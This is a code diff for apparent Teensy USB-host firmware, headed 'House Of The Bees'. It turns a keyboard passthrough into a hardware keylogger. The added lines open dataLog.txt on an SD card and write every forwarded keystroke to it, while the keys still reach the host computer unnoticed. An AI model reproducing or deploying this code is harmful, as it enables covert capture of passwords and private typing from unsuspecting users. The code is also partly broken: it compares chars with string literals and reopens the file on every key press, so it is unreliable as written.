@@ -1,7 +1,9 @@
 #include "USBHost_t36.h"
+#include "SD.h"
 
 #define SHOW_KEYBOARD_DATA
 USBHost myusb;
+File dataLog;
 USBHub hub1(myusb);
 KeyboardController keyboard1(myusb);
 BluetoothController bluet(myusb);
@@ -18,21 +20,27 @@ uint8_t keyboard_modifiers = 0;
   #define SHOW_KEYBOARD_DATA
 #endif
 
-void setup()
-{
+void setup() {
   #ifdef SHOW_KEYBOARD_DATA
     while (!Serial);
-    Serial.println("House Of The Bees !");
+    Serial.println(">> House Of The Bees ! <<");
   #endif
     myusb.begin();
 
   #ifdef SHOW_KEYBOARD_DATA
     keyboard1.attachPress(OnPress);
   #endif
+
+  if (! SD.begin(BUILTIN_SDCARD)){
+    Serial.println("SD card failed, or not present");
+    return;
+  }  
+
+  dataLog = SD.open("dataLog.txt", FILE_WRITE);
+
 }
 
-void loop()
-{
+void loop() {
   myusb.Task();
 }
 
@@ -57,6 +65,7 @@ bool bthid_driver_active[CNT_HIDDEVICES] = {false};
 #ifdef SHOW_KEYBOARD_DATA
 void OnPress(int key)
 {
+  dataLog = SD.open("dataLog.txt", FILE_WRITE);
 	switch (key)
   {
     case KEYD_UP       : Serial.print("UP"); break;
@@ -83,18 +92,16 @@ void OnPress(int key)
     case KEYD_F12      : Serial.print("F12"); break;
     default: 
     {
-      if((char)key != "�")
-      {
-        Keyboard.print((char)key);
-        Serial.print((char)key);
-      }
+      Keyboard.print((char)key);
+		  dataLog.print((char)key);
+      Serial.print((char)key);
       break;
     } 
     
 	}
   if((char)key == "\n" || (char)key == "\r")
-  {
     Serial.println("");
-  }
+
+  dataLog.close();
 }
 #endif
